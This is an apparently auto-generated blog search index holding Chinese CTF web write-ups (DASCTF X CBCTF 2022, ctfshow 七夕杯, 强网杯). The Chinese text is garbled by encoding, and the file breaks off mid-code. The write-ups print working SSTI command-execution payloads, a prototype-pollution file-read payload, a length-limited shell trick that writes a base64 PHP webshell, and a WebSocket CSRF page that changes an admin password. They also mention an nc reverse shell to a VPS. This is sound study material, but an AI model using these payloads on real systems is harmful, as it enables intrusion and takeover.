<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DASCTF X CBCTF 2022ä¹æœˆæŒ‘æˆ˜èµ›ï¼ˆwebéƒ¨åˆ†ï¼‰</title>
      <link href="/2022/09/24/DASCTF%202022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%EF%BC%88web%E9%83%A8%E5%88%86%EF%BC%89/"/>
      <url>/2022/09/24/DASCTF%202022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%EF%BC%88web%E9%83%A8%E5%88%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="dino3d"><a href="#dino3d" class="headerlink" title="dino3d"></a>dino3d</h2><p><img src="https://img-blog.csdnimg.cn/98371c199af54aafb1365732f8318399.png"><br>åœ¨åšæ¸¸æˆçš„æ—¶å€™å‘ç°å­˜åœ¨check.phpï¼Œæˆ–è€…ç›´æ¥æ‰«ç›®å½•ä¹Ÿå¯ä»¥å‘ç°<br>è¿™é‡Œå¾—åˆ°æ¥æºï¼Œçœ‹å‘åŒ…æ ¼å¼<br><img src="https://img-blog.csdnimg.cn/40855bdf301c4a53a045e07c7ee46dd6.png"><br>è·Ÿè¸ªsnå‡½æ•°çœ‹å…¶ä»å“ªé‡Œè°ƒç”¨å‘ç°<br><img src="https://img-blog.csdnimg.cn/caffd334ee6349eab79d4c3b197963bb.png"><br>å¯ä»¥å‘ç°eæ˜¯åˆ†æ•°ï¼Œtä¸ºcheckcodeï¼Œè·Ÿè¸ªcheckcodeå¯ä»¥å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/bf7cc6eda28d4a29a5e24144261ebb5b.png"><br><img src="https://img-blog.csdnimg.cn/ffa80e3c30244b5a92af9e43c1ea45e9.png"><br>æ‹¼æ¥å¾—åˆ°checkcodeä¸ºDASxCBCTF_wElc03e<br>tmçš„å‚æ•°æ˜¯æ—¶é—´æˆ³ã€scoreæ˜¯åˆ†æ•°<br>ä»è€Œå¯ä»¥æ„é€ åŒ…è¿›è¡Œå‘åŒ…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node4.buuoj.cn:25299/check.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span>():</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;score&quot;</span>: <span class="number">1000000</span>,</span><br><span class="line">        <span class="string">&quot;checkCode&quot;</span>: md5(<span class="string">&quot;1000000DASxCBCTF_wElc03e&quot;</span>.encode()).hexdigest(),</span><br><span class="line">        <span class="string">&quot;tm&quot;</span>: <span class="built_in">int</span>(time.time())</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url, data = data)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(getFlag())</span><br></pre></td></tr></table></figure><h2 id="web-Text-Reverser"><a href="#web-Text-Reverser" class="headerlink" title="web Text Reverser"></a>web Text Reverser</h2><p><a href="https://blog.csdn.net/solitudi/article/details/107752717">sstiä¸€äº›ç®€ä»‹</a><br><img src="https://img-blog.csdnimg.cn/1fd9f92d16c3409988f0614fc735d68f.png"><br><img src="https://img-blog.csdnimg.cn/8bef4c24fccd44f0b9c8e68d111cd62e.png"><br>ä¹‹åå°è¯•æ„é€ paylaod<br>è·å¾—å­ç±»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">output = <span class="string">&#x27;&#x27;&#x27;&#123;% print &quot;&quot;.__class__.__bases__[0].__subclasses__()%&#125;&#x27;&#x27;&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><p>æˆ–è€…åˆ©ç”¨è¿™ä¸ª<br>å¯ä»¥æ›´æ¢â€â€ä¸ºâ€™â€™è¿›è¡Œå°è¯•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="string">&#x27;&#x27;&#x27;&#123;% print &quot;&quot;.__class__.__mro__[2].__subclasses__() %&#125;&#x27;&#x27;&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>å‘é€åè½¬åçš„payload å¾—åˆ°ç±»åˆ—è¡¨ï¼Œç„¶åå°†è¿”å›çš„åˆ—è¡¨å†…å®¹å¤åˆ¶è¿›è„šæœ¬å¯»æ‰¾å¯åˆ©ç”¨çš„ç±»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;class &#x27;type&#x27;&gt;...&lt;class &#x27;unicodedata.UCD&#x27;&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">allList = []</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        result += i</span><br><span class="line">        allList.append(result)</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;n&quot;</span> <span class="keyword">or</span> i == <span class="string">&quot;,&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += i</span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> <span class="built_in">enumerate</span>(allList):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(k)+<span class="string">&quot;---&gt;&quot;</span>+v)</span><br><span class="line"><span class="comment">#è¿”å›ç»“æœ:132---&gt; &lt;class &#x27;os._wrap_close&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>ä¹‹åå°±æ˜¯åˆ©ç”¨popenè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span> <span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()%&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿‡æ»¤äº†å¾ˆå¤šè¯»å–æ–‡ä»¶çš„å‘½ä»¤ï¼Œå¯ä»¥åˆ©ç”¨ nlçš„ç»•è¿‡è¿‡æ»¤è¯»å–æ–‡ä»¶ï¼ˆåæµ‹è¯•ç”¨grepï¼Œrevï¼Œtailç­‰å‘½ä»¤ä¹Ÿå¯ä»¥è¯»å–flagï¼‰</p><h2 id="web-cbshop"><a href="#web-cbshop" class="headerlink" title="web cbshop"></a>web cbshop</h2><p><a href="https://blog.csdn.net/xiaoxiaocainiao_/article/details/126970812">åŸå‹é“¾ä»‹ç»</a><br><img src="https://img-blog.csdnimg.cn/855c7c0a92a34c728284c6c1ebcc2ac1.png"><br>æ‹¿åˆ°é¢˜ç›®å®¡è®¡æºç <br>å‘ç°<br><img src="https://img-blog.csdnimg.cn/755c98d5bc354fd3993fadec174e5134.png"><br><img src="https://img-blog.csdnimg.cn/a207198cde3e40f58bedf80a1f6254e8.png"><br>äºæ˜¯å¾—åˆ°adminå¯†ç ï¼ˆå°†ğŸ˜€adminğŸ˜€æ”¾å…¥æµè§ˆå™¨ï¼‰<br><img src="https://img-blog.csdnimg.cn/046eb6b49cb14875abbc3415fcf46e7d.png"><br>å¾—åˆ°å¯†ç åå‘ç°è¿˜ä¸è¡Œï¼Œäºæ˜¯ç»§ç»­å®¡è®¡å‘ç°è¿˜éœ€è¦token<br><img src="https://img-blog.csdnimg.cn/c340534731a144ec99709de76b4a0b66.png"><br>ä½†æ˜¯åœ¨å…¶ä»–åœ°æ–¹æ ¹æœ¬å°±æ‰¾ä¸åˆ°tokené€šè¿‡ä»”ç»†è§‚å¯Ÿå‘ç°<br><img src="https://img-blog.csdnimg.cn/9db90d10d9d24445bd94dba64f37e56c.png"><br>å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´<br><a href="https://cloud.tencent.com/developer/article/1841463#:~:text=%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9A%E5%B8%B8%E4%BC%9A,%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E7%AD%89%E6%BC%8F%E6%B4%9E%E3%80%82">åŸå‹é“¾æ±¡æŸ“æ¼æ´è®²è§£</a><br>æ ¹æ®ä¸Šé¢è®²è§£çš„æ¯”å¯¹å‘ç°å­˜åœ¨CVE-2021-25928<br>é€šè¿‡åˆ†æå‘ç°</p><blockquote><p>product å¯¹è±¡æ˜¯æˆ‘ä»¬postçš„jsonæ•°æ®è½¬åŒ–è€Œæ¥ï¼Œæˆ‘ä»¬å®Œå…¨å¯æ§ï¼Œè€Œè¿™é‡Œå¦‚æœæˆ‘ä»¬çš„ user.username æ˜¯ __proto__ï¼Œè¿™æ ·çš„è¯å°±ä¼šå°† product å¯¹è±¡åˆå¹¶åˆ° order çš„ <strong>proto</strong> ä¸­ï¼Œè€Œuser å’Œ order çš„åŸå‹éƒ½æ˜¯ Object ï¼Œæ˜¯åŒä¸€ä¸ªåŸå‹ï¼Œå½“ product ä¸­æ„é€  token:true æ—¶ï¼Œuser.token è®¿é—®ä¸º trueå³åªéœ€è¦ç™»å½•adminåä¿®æ”¹ç”¨æˆ·åä¸º <strong>ptoto</strong></p></blockquote><p>äºæ˜¯ä¿®æ”¹ç”¨æˆ·åä¸º__ptoto__ï¼Œä¹‹åæ„é€ product<br>è¿™é‡Œç”±äºæŠŠflagç»™è¿‡æ»¤äº†ï¼Œéœ€è¦ç»•è¿‡<br>ç¨‹åºä¼šå°†jsonè½¬åŒ–ä¸ºå¯¹è±¡<br>jsonä¸­å°†nameçš„å€¼ä¿®æ”¹ä¸ºä¸€ä¸ªå¯¹è±¡ {} å‘é€å¯ä»¥çœ‹åˆ°è¿™æ ·çš„æŠ¥é”™</p><blockquote><p>TypeError [ERR_INVALID_ARG_TYPE]: The â€œpathâ€ argument must be of type string or an instance of Buffer or URL. Received an instance of Object</p></blockquote><p>å¯ä»¥å‘ç°ä¼ å…¥çš„å‚æ•°ä¸åªæ˜¯å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ª URL å®ä¾‹ æœ¬åœ°æµ‹è¯•å‘ç°<br>ä½¿ç”¨URL å®ä¾‹å¯ä»¥æ­£å¸¸è¯»å–æ–‡ä»¶ï¼Œå°† flag è¿›è¡Œurlç¼–ç ä»è€Œç»•è¿‡ï¼Œé‚£æ„é€ ä¸€ä¸ªURLå¯¹è±¡å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;href&quot;</span>: <span class="string">&#x27;file:///fl%61g&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;origin&quot;</span>: <span class="string">&#x27;null&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;protocol&quot;</span>: <span class="string">&#x27;file:&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;host&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;hostname&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;port&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;pathname&quot;</span>: <span class="string">&#x27;/fl%61g&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;search&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;searchParams&quot;</span>: <span class="string">&quot;URLSearchParams &#123;&#125;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hash&quot;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;id&quot;</span>:2,</span><br><span class="line">    <span class="string">&quot;token&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ƒå¤•æ¯ï¼ˆwebéƒ¨åˆ†ï¼‰</title>
      <link href="/2022/08/06/ctfshow%20%E4%B8%83%E5%A4%95%E6%9D%AF/"/>
      <url>/2022/08/06/ctfshow%20%E4%B8%83%E5%A4%95%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="webç­¾åˆ°"><a href="#webç­¾åˆ°" class="headerlink" title="webç­¾åˆ°"></a>webç­¾åˆ°</h2><p>æ‹¿åˆ°é¢˜ç›® è®©æ‰§è¡Œå­—ç¬¦é•¿åº¦å°äº7çš„å‘½ä»¤<br>åˆ©ç”¨å¤§ä½¬åšå®¢<br><a href="https://blog.csdn.net/nzjdsds/article/details/102873187">å¤§ä½¬åšå®¢</a><br>å¾—åˆ°payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><h2 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h2><p>æœ¬é¢˜è€ƒå¯Ÿincludeå‡½æ•°åŒ…å«æ—¥å¿—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check(<span class="variable">$code</span>))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$result=&#x27;</span>.<span class="string">&quot;<span class="subst">$code</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$result</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">&amp;<span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$num1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;num1&#x27;</span>];</span><br><span class="line">    <span class="variable">$symbol</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;symbol&#x27;</span>];</span><br><span class="line">    <span class="variable">$num2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;num2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$num1</span>) || !<span class="keyword">isset</span>(<span class="variable">$num2</span>) || !<span class="keyword">isset</span>(<span class="variable">$symbol</span>) )&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/!|@|#|\\$|\%|\^|\&amp;|\(|_|=|&#123;|&#x27;|&lt;|&gt;|\?|\?|\||`|~|\[/&quot;</span>, <span class="variable">$num1</span>.<span class="variable">$num2</span>.<span class="variable">$symbol</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^[\+\-\*\/]$/&quot;</span>, <span class="variable">$symbol</span>))&#123;</span><br><span class="line">        <span class="variable">$code</span> = <span class="string">&quot;<span class="subst">$num1</span><span class="subst">$symbol</span><span class="subst">$num2</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æºç åå¼€å§‹ä¼ å‚<br>payload<br><img src="https://img-blog.csdnimg.cn/50c0e650ca304d1a9a2a6263f69ec699.png"></p><h2 id="easy-cmd"><a href="#easy-cmd" class="headerlink" title="easy-cmd"></a>easy-cmd</h2><p>ç›´æ¥åˆ©ç”¨ncè¿›è¡Œvpså¼¹shellä»è€Œå¾—åˆ°flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ¯ï¼ˆéƒ¨åˆ†ï¼‰</title>
      <link href="/2022/08/06/%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/"/>
      <url>/2022/08/06/%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p> é¢˜ç›®æ‰“å¼€ï¼Œå…ˆæ³¨å†Œç™»å½•ä¸€ä¸ªè´¦å·ï¼Œçœ‹æºç å‘ç°åˆ©ç”¨websocketè¿›è¡Œæ•°æ®å‘é€<br> é€šè¿‡ bugreportçœ‹ä»¥é€šå¤–ç½‘<br> äºæ˜¯åˆ©ç”¨xss+csrfè¿›è¡Œå¯†ç ä¿®æ”¹<br> åœ¨vpsä¸Šåˆ›å»ºhtmlæ–‡ä»¶ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;title&gt;&lt;/title&gt; </span><br><span class="line">&lt;script&gt; </span><br><span class="line">var url =</span><br><span class="line"><span class="string">&quot;ws://127.0.0.1:8888/bot&quot;</span>; </span><br><span class="line">var ws = new WebSocket(url); </span><br><span class="line">ws.onopen= <span class="keyword">function</span> (event) &#123; ws.send(<span class="string">&quot;changepw123&quot;</span>); &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>8888ç«¯å£æ˜¯ç»è¿‡å°è¯•åˆ¤æ–­å‡ºæ¥çš„<br>å‘é€bugreport <a href="http://ip:port/1.html">http://ip:port/1.html</a><br>ç™»å½•admin ä¹°æç¤ºå¾—åˆ°æºç <br>è¿›è¡Œå®¡è®¡<br><img src="https://img-blog.csdnimg.cn/a9994b86b51a4d8e8a6302c62c9812db.png"><br>å®¡è®¡ä¼ ä¸¤ä¸ªproductï¼ˆï¼‰<br><img src="https://img-blog.csdnimg.cn/c74394f5bdea47439bf5f220ab8a83e6.png"><br>å¾—åˆ°flag</p><h2 id="carsh"><a href="#carsh" class="headerlink" title="carsh"></a>carsh</h2><p>ä¸ä¼š  ä¹‹åçœ‹å…¶ä»–äººå†™çš„åå†™çš„è¦ç‚¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># import sqlite3</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response,request, session</span><br><span class="line"><span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,static_url_path=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">app.secret_key=random.randbytes(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, username,password</span>):</span></span><br><span class="line">        self.username=username</span><br><span class="line">        self.token=<span class="built_in">hash</span>(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_password</span>(<span class="params">username</span>):</span></span><br><span class="line">    <span class="keyword">if</span> username==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> admin.secret</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># conn=sqlite3.connect(&quot;user.db&quot;)</span></span><br><span class="line">        <span class="comment"># cursor=conn.cursor()</span></span><br><span class="line">        <span class="comment"># cursor.execute(f&quot;select password from usertable where username=&#x27;&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line">        <span class="comment"># data=cursor.fetchall()[0]</span></span><br><span class="line">        <span class="comment"># if data:</span></span><br><span class="line">        <span class="comment">#     return data[0] </span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     return None</span></span><br><span class="line">        <span class="keyword">return</span> session.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/balancer&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    pickle_data=base64.b64decode(request.cookies.get(<span class="string">&quot;userdata&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> pickle_data <span class="keyword">or</span> <span class="string">b&quot;secret&quot;</span> <span class="keyword">in</span> pickle_data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You damm hacker!&quot;</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -rf *py*&quot;</span>)</span><br><span class="line">    userdata=pickle.loads(pickle_data)</span><br><span class="line">    <span class="keyword">if</span> userdata.token!=<span class="built_in">hash</span>(get_password(userdata.username)):</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Login First&quot;</span></span><br><span class="line">    <span class="keyword">if</span> userdata.username==<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome admin, here is your next challenge!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;You&#x27;re not admin!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    resp = make_response(<span class="string">&quot;success&quot;</span>) </span><br><span class="line">    session[<span class="string">&quot;password&quot;</span>]=request.values.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">&quot;userdata&quot;</span>, base64.b64encode(pickle.dumps(User(request.values.get(<span class="string">&quot;username&quot;</span>),request.values.get(<span class="string">&quot;password&quot;</span>)),<span class="number">2</span>)), max_age=<span class="number">3600</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;source.txt&#x27;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span 